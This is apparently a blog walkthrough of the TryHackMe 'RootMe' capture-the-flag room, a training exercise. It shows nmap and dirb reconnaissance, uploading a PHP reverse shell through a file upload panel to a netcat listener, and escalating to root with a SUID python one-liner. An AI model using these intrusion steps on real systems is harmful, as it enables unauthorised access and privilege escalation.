# RootMe Walkthrough


One of the best ways to learn ethical hacking is to practice it. So below is a walkthrough of the [RootMe Room on THM](https://tryhackme.com/room/rrootme)

# Reconnaissance

## Nmap
As with most machines, I began with an Nmap scan - which answers the first few questions. 

I firstly scanned with sV to determine the software versions, however as the target wouldn't respond to host discovery, I had to disable it using the -Pn option.

```sh
$ nmap -sV -Pn 10.10.130.205
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-03 20:08 BST
Nmap scan report for 10.10.130.205
Host is up (0.068s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.90 seconds
```

## Directory Searching

Next we had to preform a directory brute force, so I started dirb.

```sh
$ dirb http://10.10.130.205

-----------------
DIRB v2.22
By The Dark Raver
-----------------

START_TIME: Mon May  3 20:09:00 2021
URL_BASE: http://10.10.130.205/
WORDLIST_FILES: /data/data/com.termux/files/usr/share/dirb/wordlists/common.txt

-----------------
GENERATED WORDS: 4612

---- Scanning URL: http://10.10.130.205/ ----
                                                                                    ==> DIRECTORY: http://10.10.130.205/css/
+ http://10.10.130.205/index.php (CODE:200|SIZE:616)
==> DIRECTORY: http://10.10.130.205/js/
==> DIRECTORY: http://10.10.130.205/panel/
```

# Getting a Shell

From the recon above, we discover the page /panel/ and when we navigate to that page, we are presented with a file upload area.

Now I wondered if we could upload a shell and as we know the server runs Apache I grabbed the [Pentest Monkey Reverse PHP Shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php).

Firstly, we setup a netcat listener ready to receive the shell on the attacking machine.

```sh
$ nc -nvlp 1234
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234
```

Next I edited line 49 of the shell to match my attacking machine's IP address and uploaded it to the website.

Once we uploaded the file, we are provided with a success message; it says Veja - which means go. So if you click on the link it will open the file, this will cause the page to freeze.

Now we return to the netcat listener and we have received a shell and can find the user flag.

# Privilege Escalation

Now we have found the user flag, we need to escalate our privileges. To do this, I used to find files with a SUID bit.

```sh
find / -perm /4000 2>/dev/null
```

From that, you need to look at the list and see if there are any unusual files. Unfortunately, this step needs experience for you to know what is unusual; therefore I advise that you enter the file names into [GTFObins](https://gtfobins.github.io/) and looking for SUID exploits.

After running down the list, you discover that python has a SUID vulnerability, so now you run it on the reverse shell.

Once the exploit is complete, I use the whoami command to check it worked

```sh
usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
whoami
root
```

From here you need to find the root flag by outputting the file in the root users home directory.

